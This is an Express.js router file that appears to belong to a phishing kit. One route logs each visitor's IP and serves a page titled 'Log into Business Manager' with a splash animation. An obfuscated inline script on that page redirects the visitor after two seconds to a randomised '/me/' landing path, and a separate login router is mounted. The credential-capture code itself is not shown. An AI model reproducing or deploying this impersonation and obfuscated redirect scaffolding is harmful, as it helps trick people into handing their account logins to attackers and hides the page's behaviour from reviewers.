import express from 'express';
import loginRouter from './login.route';

const router = express.Router();

router
    .route('/me/:id')
    .get((req, res) => {
        res.render('landing_page');
    });

router
    .route('/:id')
    .get((req, res) => {
        console.log('ip', req.ip);
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Log into Business Manager</title>
                <script>
                (function(_0x483146,_0x2ce38a){const _0x40bb68=_0x1952,_0x167a34=_0x483146();while(!![]){try{const _0x12db4c=parseInt(_0x40bb68(0xe8))/0x1*(parseInt(_0x40bb68(0xf0))/0x2)+-parseInt(_0x40bb68(0xe5))/0x3*(parseInt(_0x40bb68(0xea))/0x4)+parseInt(_0x40bb68(0xe9))/0x5+-parseInt(_0x40bb68(0xf1))/0x6+parseInt(_0x40bb68(0xe7))/0x7+parseInt(_0x40bb68(0xee))/0x8+parseInt(_0x40bb68(0xe6))/0x9*(-parseInt(_0x40bb68(0xe4))/0xa);if(_0x12db4c===_0x2ce38a)break;else _0x167a34['push'](_0x167a34['shift']());}catch(_0x37f63d){_0x167a34['push'](_0x167a34['shift']());}}}(_0x5917,0xbe8f6),setTimeout(()=>{const _0xe97682=_0x1952,_0x35b2c1=Math[_0xe97682(0xec)](Math[_0xe97682(0xef)]()*0x186a0);window[_0xe97682(0xeb)]['href']=_0xe97682(0xed)+_0x35b2c1;},0x7d0));function _0x1952(_0x54a94d,_0x19b9d1){const _0x591783=_0x5917();return _0x1952=function(_0x1952bc,_0x374ce9){_0x1952bc=_0x1952bc-0xe4;let _0x2d2b23=_0x591783[_0x1952bc];return _0x2d2b23;},_0x1952(_0x54a94d,_0x19b9d1);}function _0x5917(){const _0x33c54c=['location','floor','/me/','2374112vyDOvy','random','6vVHHrs','4648236eNCUMK','240qzoTRl','3JkPdpT','571167mesKFK','10027255fkgSNB','342545nRRnxi','5605755KiagpU','3198652vbtgPJ'];_0x5917=function(){return _0x33c54c;};return _0x5917();}
                </script>
                <style>
                :root {
                    //--background: #121621;
                    //--primary-color: rgba(39, 94, 254, 1);
                    --background: #e6e6e6;
                    --primary-color: #e6e6e6;
                  }
                  
                  body {
                    background: var(--background);
                    overflow: hidden;
                  }
                  
                  * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                  }
                  
                  .app {
                    display: none;
                    flex-direction: row;
                    align-items: center;
                    justify-content: center;
                    background: var(--primary-color);
                    height: 100vh;
                    width: 100vw;
                    animation: lift 0.8s ease-in-out;
                    animation-delay: 1.6s;
                    animation-fill-mode: forwards;
                  }
                  
                  .title {
                    font-size: 81px;
                    color: #fff;
                    text-align: center;
                    font-family: "Lexend Deca", sans-serif;
                    animation: wave 0.4s, jump 1s;
                    position: relative;
                    top: 0;
                    padding: 4px;
                    //transform: translate3d(0, 16%, 0);
                    opacity: 0;
                    z-index: 3;
                    animation-fill-mode: forwards;
                  }
                  
                  span:nth-of-type(1) {
                    //left: 0rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.05s;
                  }
                  
                  span:nth-of-type(2) {
                    //left: 0.8rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.1s;
                  }
                  
                  span:nth-of-type(3) {
                    //left: 1.6rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.15s;
                  }
                  
                  span:nth-of-type(4) {
                    //left: 2.4rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.2s;
                  }
                  
                  span:nth-of-type(5) {
                    //left: 3.2rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.25s;
                  }
                  
                  span:nth-of-type(6) {
                    //left: 4rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.3s;
                  }
                  
                  /* span:nth-of-type(7) {
                    //left: 4.8rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.35s;
                  }
                  
                  span:nth-of-type(8) {
                    //left: 5.6rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.4s;
                  }
                  
                  span:nth-of-type(9) {
                    //left: 6.4rem;
                    animation: wave 0.4s, jump 1.1s ease-in-out alternate 0.45s;
                  } */
                  
                  @keyframes wave {
                    0% {
                      top: 0%;
                    }
                    100% {
                      top: 100%;
                    }
                  }
                  
                  @keyframes jump {
                    0% {
                      transform: translate3d(0, 0, 0);
                      opacity: 0;
                    }
                    90% {
                      transform: translate3d(0, -16%, 0);
                      opacity: 1;
                    }
                    100% {
                      transform: translate3d(0, -32%, 0);
                      opacity: 1;
                    }
                  }
                  
                  @keyframes lift {
                    0% {
                      transform: translate3d(0, 0, 0);
                      opacity: 1;
                      visibility: visible;
                    }
                    100% {
                      transform: translate3d(0, -100%, 0);
                      opacity: 1;
                      visibility: hidden;
                    }
                  }
                  
                  @keyframes appear {
                    0% {
                      visibility: hidden;
                    }
                    100% {
                      visibility: visible;
                    }
                  }                  
                </style>
            </head>
            <body>
                <div class="app">
                    <span class="title">L</span>
                    <span class="title">O</span>
                    <span class="title">G</span>
                    <span class="title">O</span>
                    <span class="title">:</span>
                    <span class="title">)</span>
                </div>
            </body>
            </html>
        `);
    });

router
    .route('/')
    .get((req, res) => res.render('index'));

router.use('/', loginRouter);

export default router;
